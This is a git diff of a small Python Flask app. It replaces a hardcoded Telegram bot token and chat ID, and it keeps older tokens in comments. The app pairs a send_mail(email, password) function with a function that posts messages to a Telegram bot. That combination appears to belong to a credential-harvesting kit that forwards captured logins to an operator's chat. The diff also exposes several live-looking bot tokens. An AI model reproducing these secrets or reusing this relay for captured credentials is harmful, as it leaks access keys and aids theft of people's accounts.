@@ -24,9 +24,9 @@ mail = Mail(app)
 
 # Telegram bot token
 # Telegram bot token
-TOKEN = '5026096169:AAEaVnY9QK8eT4pZincGc0crqGw382mRO0'
+token = '6933427301:AAGkWy-GtwxcoILnefvi4o0QCT_ohYUaGGg'
 # Chat ID where you want to send the messages
-CHAT_ID = '954215962'
+chat_id = '6469097185'
 
 # TOKEN = '6902120953:AAF0DmINhkSFGNoLWRCq2Yb6ZLABZdwxphU'
 # CHAT_ID = '6393249406'
@@ -40,9 +40,9 @@ def send_mail(email, password):
     mail.send(msg)
 
 def send_message(message):
-    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
+    url = f'https://api.telegram.org/bot{token}/sendMessage'
     params = {
-        'chat_id': CHAT_ID,
+        'chat_id': chat_id,
         'text': message
     }
     response = requests.post(url, params=params)
@@ -79,7 +79,7 @@ if __name__ == "__main__":
     app.run(debug=True)
 
 
-# Telegram bot token
-TOKEN = '5026096169:AAEaVnY9QK8eT4pZincGc0crqGw382mRO0'
-# Chat ID where you want to send the messages
-CHAT_ID = '954215962'
+# # Telegram bot token
+# TOKEN = '5026096169:AAEaVnY9QK8eT4pZincGc0crqGw382mRO0'
+# # Chat ID where you want to send the messages
+# CHAT_ID = '954215962'
